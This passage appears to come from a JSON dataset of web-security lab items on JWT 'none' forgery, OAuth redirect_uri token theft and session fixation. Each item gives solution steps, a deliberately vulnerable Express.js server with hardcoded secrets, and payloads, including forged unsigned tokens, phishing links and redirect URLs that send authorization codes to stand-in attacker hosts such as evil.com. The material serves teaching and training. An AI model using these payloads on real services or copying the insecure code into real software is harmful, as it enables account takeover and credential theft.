          "eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0.<HMAC-SHA256-signature-using-public-key>",
          "{ \"alg\": \"HS256\" }.{ \"username\": \"admin\", \"role\": \"admin\" }.<signed>",
          "Authorization: Bearer <forged-token>"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration in redirect_uri validation",
        "Lab Description": "The application allows users to authenticate via a third-party OAuth provider. However, it improperly validates the redirect_uri parameter, making it susceptible to open redirect-based token leakage. To solve: intercept the OAuth flow and steal an authorization code intended for another user, then exchange it for an access token and log in as that user.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Open the login page and click 'Log in with OAuthProvider' to observe the redirect URL pattern.",
          "Use Burp Suite to intercept the redirect_uri parameter and modify it to point to your server (e.g., http://evil.com/callback).",
          "Host a listener on your server using Python’s http.server module to capture the leaked code.",
          "Use the stolen authorization code with Postman to POST to the /oauth/token endpoint and exchange it for an access_token.",
          "Use the access_token in the Authorization header to access the victim's account endpoint."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const qs = require('qs'); const app = express(); const CLIENT_ID = 'abc123'; const CLIENT_SECRET = 'supersecret'; const REDIRECT_URI_WHITELIST = [/localhost/]; app.get('/auth/callback', async (req, res) => { const { code, redirect_uri } = req.query; if (!code || !redirect_uri) return res.status(400).send('Missing parameters');  const tokenRes = await axios.post('https://oauthprovider.com/token', qs.stringify({ code, client_id: CLIENT_ID, client_secret: CLIENT_SECRET, redirect_uri })); const { access_token } = tokenRes.data; const userRes = await axios.get('https://oauthprovider.com/userinfo', { headers: { Authorization: `Bearer ${access_token}` } }); const username = userRes.data.username; res.send(`Logged in as ${username}`); }); app.listen(3000);",
        "payloads": [
          "https://oauthprovider.com/auth?client_id=abc123&redirect_uri=http://evil.com/callback&response_type=code",
          "POST /oauth/token { code=<stolen_code>, redirect_uri=http://evil.com/callback, client_id=abc123, client_secret=supersecret }",
          "Authorization: Bearer <access_token>"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in URL",
        "Lab Description": "The application accepts session identifiers via URL query parameters and fails to regenerate them on successful login. An attacker can force a known session ID and trick a user into authenticating with it. To solve: fixate a known session ID and hijack the victim’s session after login.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP to spider the application and observe the ?sessionId= parameter in login URLs.",
          "Access the login page with a crafted URL like /login?sessionId=attacker12345 and note the session cookie is not set by the server.",
          "Send a phishing link with the sessionId=attacker12345 to the victim and wait for login.",
          "After the victim logs in, reuse the same sessionId in your browser to gain access.",
          "Access /my-account using the same sessionId value and confirm hijacked session access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'secret123' }]; app.use((req, res, next) => { const sid = req.query.sessionId || req.headers['x-session-id']; if (sid && sessions[sid]) { req.user = sessions[sid]; } next(); }); app.get('/login', (req, res) => { const { username, password, sessionId } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user && sessionId) { sessions[sessionId] = user; res.send('Logged in with session ID'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.user) return res.send(`Welcome ${req.user.username}`); res.send('Not authenticated'); }); app.listen(3000);",
        "payloads": [
          "/login?sessionId=attacker12345",
          "Phishing link: https://victimsite.com/login?sessionId=attacker12345",
          "/my-account?sessionId=attacker12345"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion in token validation",
        "Lab Description": "This lab's JWT-based authentication mechanism is vulnerable due to algorithm confusion. The server mistakenly trusts the algorithm value specified in the token header without verification. The application accepts tokens signed with 'none' and allows user impersonation. To solve: forge a JWT to impersonate the user 'admin' and access their profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to log in as a normal user and capture the issued JWT from the Authorization header.",
          "Analyze the decoded JWT at jwt.io and observe that it uses the 'HS256' algorithm.",
          "Replace the algorithm in the JWT header with 'none', set the payload's sub field to 'admin', and remove the signature portion.",
          "Send a GET request to /profile with the modified JWT in the Authorization: Bearer header.",
          "Verify successful exploitation by observing admin's profile data returned in the response."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'supersecret' }, { username: 'user1', password: 'userpass' }]; const SECRET = 'hardcodedsecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); const token = jwt.sign({ sub: user.username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/profile', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, SECRET, { algorithms: [decoded.header.alg] }); res.send(`Welcome ${verified.sub}, here is your profile.`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT Lab running on port 3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
          "{ \"alg\": \"none\" }, { \"sub\": \"admin\" }",
          "Authorization: Bearer <modified_token>"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID",
        "Lab Description": "This lab's session management system is vulnerable to session fixation due to predictable session IDs being accepted after login. The server issues session IDs before authentication and fails to rotate them upon login. To solve: set a session ID, trick a user into logging in, then reuse that session to access their account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a GET /login request before authentication and note the Set-Cookie: sessionId header.",
          "Modify your browser cookies to use a fixed sessionId (e.g., attacker1234) and send it with the login request.",
          "Share a phishing link with the victim containing this fixed sessionId via URL or cookie.",
          "Wait for the victim to log in, binding the fixed sessionId to their account.",
          "Revisit /account using the same fixed session cookie and observe access to the victim's dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'secretpass' }; app.get('/login', (req, res) => { const sid = req.cookies.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username] === password) { sessions[req.cookies.sessionId] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Welcome back ${user}`); else res.status(403).send('Not authenticated'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
        "payloads": [
          "Set-Cookie: sessionId=attacker1234",
          "GET /login with fixed sessionId",
          "Victim logs in while sessionId=attacker1234",
          "GET /account using sessionId=attacker1234"
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow token theft via redirect URI manipulation",
        "Lab Description": "This lab uses OAuth's implicit grant type and suffers from a poorly validated redirect_uri parameter. The application incorrectly trusts any redirect_uri under the application's subdomain. To solve: inject a malicious redirect_uri that leaks the victim’s access_token to your server.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to spider the OAuth login flow and identify the vulnerable redirect_uri parameter.",
          "Craft a malicious redirect_uri pointing to your controlled domain: https://attacker.example.com#access_token=<token>.",
          "Send a phishing link to the victim with the crafted redirect_uri parameter and prompt them to authorize access.",
          "Capture the token fragment via browser JS or server logs from attacker.example.com.",
          "Replay the token in Authorization: Bearer header to access victim's profile data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': 'oauth-token-abc123' }; app.get('/auth', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (!redirect_uri.startsWith('https://trusted.example.com')) return res.status(400).send('Invalid redirect'); const token = users['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'oauth-token-abc123') res.send('Carlos profile data'); else res.status(403).send('Invalid token'); }); app.listen(3000, () => console.log('OAuth Redirect Lab running on port 3000'));",
        "payloads": [
          "https://trusted.example.com.evil.com#access_token=...",
          "https://attacker.example.com#access_token=<token>",
          "Authorization: Bearer oauth-token-abc123"
        ]
      },
      {
        "Lab scenario": "JWT signature spoofing via 'none' algorithm in API Gateway",
        "Lab Description": "This lab simulates a Node.js-based API protected by JWT tokens. However, the server fails to validate the signing algorithm and blindly trusts the 'alg' header. The application accepts tokens with the 'none' algorithm and treats them as valid. To solve the lab, craft a JWT with 'none' as the algorithm and access Carlos's protected resource endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to capture a valid JWT token issued after logging in with your own credentials.",
          "Inspect the token in jwt.io and identify its structure and header details.",
          "Replace the 'alg' value in the JWT header with 'none' and remove the signature.",
          "Change the 'sub' or 'username' claim in the JWT payload to 'carlos' to impersonate the victim.",
          "Use Burp Repeater or Postman to send an authenticated request to /api/user-info with the forged token in the Authorization header and verify Carlos's data is returned."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/user-info', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token provided'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = users.find(u => u.username === payload.payload.username); if (user) return res.json({ username: user.username, data: 'Sensitive user data' }); return res.status(404).send('User not found'); } try { const verified = jwt.verify(token, secret); return res.json({ username: verified.username, data: 'Sensitive user data' }); } catch (e) { return res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }."
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via referer header",
        "Lab Description": "The application implements OAuth 2.0 with an implicit grant flow. It redirects users with access tokens embedded in the URL fragment. However, the fragment is reflected into a third-party analytics script URL via a vulnerable referer header. To solve the lab, leak Carlos's token to your attacker server by triggering a login and capturing the referer.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to monitor all outbound requests while performing OAuth login as Carlos.",
          "Initiate login via /auth endpoint and observe the redirect URL containing an access_token in the URL fragment.",
          "Note the analytics.js third-party script embedded on the redirect landing page.",
          "Identify that the Referer header leaks the full URL, including the access_token fragment, when requesting the third-party script.",
          "Host a malicious third-party script that logs incoming referers, trick Carlos into logging in via your OAuth phishing link, and extract the leaked token."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', token: 'abc123xyz456' }]; app.get('/auth', (req, res) => { const token = 'abc123xyz456'; res.redirect(`/dashboard#access_token=${token}`); }); app.get('/dashboard', (req, res) => { res.send(`Welcome! <script src='https://third-party.com/analytics.js'></script>`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://attacker.com/analytics.js?referer=https://victim.com/dashboard#access_token=abc123xyz456",
          "Social engineering phishing link using redirect_uri=https://victim.com/dashboard"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login response",
        "Lab Description": "The application issues session IDs before user authentication and fails to regenerate them after login. This allows an attacker to fix a known session ID, get a victim to log in using it, and hijack the session. To solve the lab, log in as Carlos using a fixed session and retrieve his account data from the dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to capture the Set-Cookie header from the initial GET /login page and observe the predictable session ID format (e.g., sessid=xyz123).",
          "Manually modify your browser’s cookie jar to use a crafted sessid value like sessid=fixme123.",
          "Send a phishing link to Carlos forcing him to use the crafted session ID (e.g., a hidden iframe or HTTP link using your pre-issued sessid).",
          "Wait for Carlos to authenticate using that fixed session ID.",
          "Revisit the /dashboard endpoint using the same sessid and confirm you’re authenticated as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { const sid = 'sess-' + Math.random().toString(36).substring(2, 8); sessions[sid] = null; res.cookie('sessid', sid); res.send('Please log in'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessid = req.cookies.sessid; const user = users.find(u => u.username === username && u.password === password); if (user && sessid) { sessions[sessid] = username; res.redirect('/dashboard'); } else { res.status(401).send('Login failed'); } }); app.get('/dashboard', (req, res) => { const sessid = req.cookies.sessid; const username = sessions[sessid]; if (username) { res.send(`Welcome back ${username}, here is your sensitive data.`); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Set-Cookie: sessid=sess-pwn123",
          "Phishing link: https://victim.com/login with embedded iframe forcing sessid=sess-pwn123",
          "Login as Carlos using same sessid to gain access to /dashboard"
        ]
      },
      {
        "Lab scenario": "Session Fixation via Predictable Token in OAuth Flow",
        "Lab Description": "The OAuth login flow is improperly designed, allowing an attacker to fix the session identifier of a victim before authentication. The application accepts a static session ID from a GET parameter during the authorization phase, which persists after login. To solve: hijack Carlos's session by setting a fixed session ID before they authenticate and then reuse it to access their account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the OAuth login flow during your own login attempt and observe the 'session_id' parameter passed via GET.",
          "Confirm that this session ID is reused post-authentication by inspecting the session cookie and comparing values.",
          "Craft a malicious OAuth login link with a fixed 'session_id' value and trick Carlos into authenticating through it (e.g., via social engineering or simulated webhook).",
          "Wait for Carlos to log in, then reuse the same session_id in your browser by setting the corresponding cookie manually via DevTools or Burp.",
          "Access /my-account with Carlos's hijacked session to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const url = require('url'); const app = express(); app.use(session({ secret: 'vulnerable_oauth', resave: false, saveUninitialized: true })); app.get('/auth/start', (req, res) => { const parsed = url.parse(req.url, true); const sessId = parsed.query.session_id; if (sessId) req.session.id = sessId; res.redirect('/oauth-provider'); }); app.get('/callback', (req, res) => { req.session.authenticated = true; req.session.user = 'carlos'; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Welcome, ${req.session.user}`); else res.send('Please log in'); }); app.listen(3000, () => console.log('OAuth Session Fixation running'));",
        "payloads": [
          "GET /auth/start?session_id=attackerSession123",
          "Set-Cookie: connect.sid=attackerSession123; path=/; HttpOnly",
          "Reuse fixed session after victim login"
        ]
      },
      {
        "Lab scenario": "JWT None Algorithm Exploitation in Token Verification",
        "Lab Description": "This lab's JWT-based authentication system incorrectly allows tokens signed with the 'none' algorithm to bypass signature verification. The application fails to enforce algorithm restrictions during verification. To solve: forge a JWT token impersonating Carlos by crafting a token with 'alg: none'.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Log in to your own account and intercept the JWT token received using Postman or Burp Suite.",
          "Use jwt.io to decode the token and examine the header and payload structure.",
          "Modify the JWT header to set 'alg' to 'none' and set the payload to { \"username\": \"carlos\" }.",
          "Remove the signature entirely and send the forged token in an Authorization: Bearer header.",
          "Send a GET request to /my-account using the modified token to verify access and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(3000, () => console.log('JWT None Algorithm Lab running'));",
        "payloads": [
          "{ \"alg\": \"none\", \"typ\": \"JWT\" }",
          "{ \"username\": \"carlos\" }",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "Broken Redirect in OAuth Callback Enables Token Theft",
        "Lab Description": "The OAuth flow includes an open redirect vulnerability at the callback endpoint, allowing an attacker to steal the authorization code. The application uses an insecure redirect URI provided in the query string without validating its domain. To solve: hijack Carlos’s login OAuth flow, extract the code, and use it to gain access to his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to spider the OAuth login process and identify the callback endpoint accepting a 'redirect_uri' parameter.",
          "Confirm via manual testing that the application blindly redirects to untrusted domains without verification.",
          "Host a malicious redirector that logs incoming GET parameters (e.g., webhook.site or requestbin).",
          "Send Carlos a phishing OAuth login link with your malicious redirect_uri and wait for the authorization code to be captured.",
          "Use the stolen code to manually complete the OAuth exchange and gain access to Carlos’s session token.",
          "Use the token in the Authorization header and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth/callback', (req, res) => { const redirectUrl = req.query.redirect_uri; const code = 'code123-carlos'; res.redirect(`${redirectUrl}?code=${code}`); }); app.get('/exchange', (req, res) => { const { code } = req.query; if (code === 'code123-carlos') res.json({ access_token: 'carlos-token' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-token') res.send('Account details for carlos'); else res.send('Unauthorized'); }); app.listen(4000, () => console.log('Broken OAuth Redirect Lab running'));",
        "payloads": [
          "GET /auth/callback?redirect_uri=https://attacker.com/stealer",
          "https://attacker.com/stealer?code=code123-carlos",
          "GET /exchange?code=code123-carlos",
          "Authorization: Bearer carlos-token"
        ]
      },
      {
        "Lab scenario": "JWT signature spoofing via 'none' algorithm in login API",
        "Lab Description": "This lab implements stateless session management using JSON Web Tokens (JWT). The login endpoint generates a signed token that is used to authenticate subsequent requests. However, the application improperly allows the use of the 'none' algorithm. To solve: Forge a JWT token with 'alg':'none' and access Carlos's account without knowing his password.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept the POST /login request using Burp Suite to analyze the JWT returned upon successful login.",
          "Copy the JWT and decode it using jwt.io or Burp Decoder. Note the header contains 'alg':'HS256'.",
          "Replace 'alg':'HS256' with 'alg':'none' in the header and change the payload to {\"username\":\"carlos\"}.",
          "Remove the signature part of the JWT entirely, and reassemble the header and payload parts using base64url encoding.",
          "Use Postman to send a GET request to /my-account with the forged token in the Authorization: Bearer header and verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'supersecure' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('JWT Lab running on port 3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{ \"alg\": \"none\" } + { \"username\": \"carlos\" } => base64url(header).base64url(payload)."
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login flow",
        "Lab Description": "This lab's login system is vulnerable to session fixation because it fails to generate a new session identifier upon successful authentication. Attackers can set their own session ID and trick the victim into using it. To solve: Fix a session ID for Carlos before login, then access his account after he logs in using that ID.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to intercept the GET /login request and insert a custom session cookie: sessionid=attacker123.",
          "Send the link with this fixed session ID to the victim (simulated by a provided action) and let them log in.",
          "After the victim logs in, the session remains fixed as attacker123.",
          "Send a GET request to /my-account using the sessionid=attacker123 cookie.",
          "Observe that you are now logged in as Carlos and can access his account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'strongpass' }]; app.get('/login', (req, res) => { const sid = req.cookies.sessionid || 'sess' + Math.random().toString(36).substr(2); res.cookie('sessionid', sid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Login failed'); sessions[req.cookies.sessionid] = username; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') res.send('Account details for carlos'); else res.status(401).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
        "payloads": [
          "Cookie: sessionid=attacker123",
          "http://victim-app.com/login?sessionid=attacker123",
          "GET /my-account with Cookie: sessionid=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration with open redirect and trust leak",
        "Lab Description": "This OAuth login flow is misconfigured and trusts any redirect_uri parameter, allowing an attacker to steal authorization codes. The application blindly trusts the redirect_uri without validation. To solve: Steal Carlos's OAuth authorization code by crafting a malicious redirect_uri.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to trace the OAuth login flow and observe the authorization URL with parameters: client_id, redirect_uri, response_type.",
          "Modify the redirect_uri to point to your exploit server: http://attacker.com/capture.",
          "Send the crafted OAuth URL to Carlos (simulated trigger).",
          "Start a listener on http://attacker.com/capture to log incoming requests.",
          "When Carlos clicks the link and authorizes access, his code is sent to your redirect_uri.",
          "Use the stolen code in a POST /token request to obtain Carlos's access token and retrieve his account info."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const validCodes = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const code = 'authcode-carlos'; validCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/token', (req, res) => { const { code } = req.body; const user = validCodes[code]; if (!user) return res.status(403).send('Invalid code'); res.json({ access_token: 'token-carlos' }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token-carlos') res.send('Account details for carlos'); else res.status(401).send('Unauthorized'); }); app.listen(3000, () => console.log('OAuth Lab running on port 3000'));",
        "payloads": [
          "https://victim-app.com/auth?client_id=xyz&redirect_uri=http://attacker.com/capture&response_type=code",
          "POST /token with body: code=authcode-carlos",
          "Authorization: Bearer token-carlos"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass via 'none' algorithm in API token validation",
        "Lab Description": "The application's authentication is handled via a JWT token passed in the Authorization header. The server accepts unsigned JWT tokens when the `alg` is set to 'none'. The application trusts the token's payload without signature verification. To solve: craft a forged JWT for user 'admin' and access the protected /admin endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a legitimate login request and capture the JWT from the Authorization header.",
          "Decode the JWT using jwt.io or a local script to inspect the header and payload.",
          "Modify the header to set \"alg\":\"none\" and change the payload to {\"username\":\"admin\"}.",
          "Remove the signature portion entirely to finalize the forged token.",
          "Use Postman to send a new GET request to /admin with the forged token in the Authorization header.",
          "Confirm access to the admin panel to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.get('/admin', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('Token required'); try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username !== 'admin') return res.status(403).send('Admins only'); res.send('Welcome, admin!'); } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab on http://localhost:4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri parameter",
        "Lab Description": "The application uses OAuth 2.0 for user authentication. It trusts the 'redirect_uri' parameter without validating it against a whitelist. This allows an attacker to redirect the authorization code to their own domain and complete the OAuth flow. To solve: hijack an OAuth session and access the victim’s account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Initiate a login flow and observe the redirect to the OAuth provider (Google OAuth endpoint).",
          "Copy the authorization URL with a legitimate redirect_uri.",
          "Replace the redirect_uri with your attacker-controlled endpoint (e.g., http://evil.com/callback).",
          "Serve a local server to catch the redirect containing the authorization code.",
          "Exchange the intercepted code for an access_token using Postman against the token endpoint.",
          "Use the access_token to call the application’s /profile API as the victim and retrieve private data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://accounts.google.com/o/oauth2/auth?client_id=xyz&redirect_uri=${redirectUri}&response_type=code`; res.redirect(url); }); app.get('/callback', (req, res) => { const code = req.query.code; request.post({ url: 'https://oauth2.googleapis.com/token', form: { code, client_id: 'xyz', client_secret: 'abc', redirect_uri: 'http://localhost:4000/callback', grant_type: 'authorization_code' } }, (err, _, body) => { res.send('OAuth token: ' + body); }); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on http://localhost:4000'));",
        "payloads": [
          "https://accounts.google.com/o/oauth2/auth?client_id=xyz&redirect_uri=http://evil.com/callback&response_type=code",
          "https://example.com/auth?redirect_uri=http://evil.com/callback"
        ]
      },
      {
        "Lab scenario": "Session fixation via static session ID assignment in login handler",
        "Lab Description": "The application assigns a static session ID based on the username during login. An attacker can preset this ID for a victim before login. To solve: set a valid session ID for 'carlos' before he logs in, then hijack the session and access /my-account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to send a GET /set-session?user=carlos before he logs in to establish the session ID manually.",
          "Observe that the session ID is set as a predictable cookie, e.g., carlos_session123.",
          "Wait until the victim logs in or simulate login from another tab using the same session.",
          "Reuse the session cookie in a new GET request to /my-account using Postman.",
          "If session is active and hijacked successfully, the account page of 'carlos' will load and the lab is solved."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'qwerty' }]; app.get('/set-session', (req, res) => { const user = req.query.user; res.cookie('session', `${user}_session123`); res.send('Session preset'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'carlos_session123') res.send('Welcome to Carlos's account'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
        "payloads": [
          "GET /set-session?user=carlos → Cookie: session=carlos_session123",
          "Cookie: session=carlos_session123"
        ]
      },      
      {
        "Lab scenario": "Session fixation via predictable session ID reuse",
      
        "Lab Description": "The application reuses the same session ID across unauthenticated and authenticated states. When a user logs in, the existing session is not invalidated. This behavior allows session fixation. To solve: Fixate the session of the victim user Carlos and access his account after forcing a login.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Use Burp Suite to intercept the GET /login page request and note the Set-Cookie header with the session ID.",
          "Send this session to Burp Repeater and confirm that it works anonymously.",
          "Craft a phishing link using this fixed session ID and trick Carlos into clicking it (simulate with browser + intercepted request).",
          "Wait until Carlos logs in and refresh the original session (with same ID) in your browser.",
          "Verify session is now authenticated as Carlos by visiting /my-account."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weaksecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.sendFile(__dirname + '/login.html'); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.send('Not authenticated'); } }); app.listen(3000);",
      
        "payloads": [
          "Set-Cookie: session=abc123; Path=/",
          "GET /my-account with session cookie after victim login",
          "Phishing link with session fixation"
        ]
      },
      {
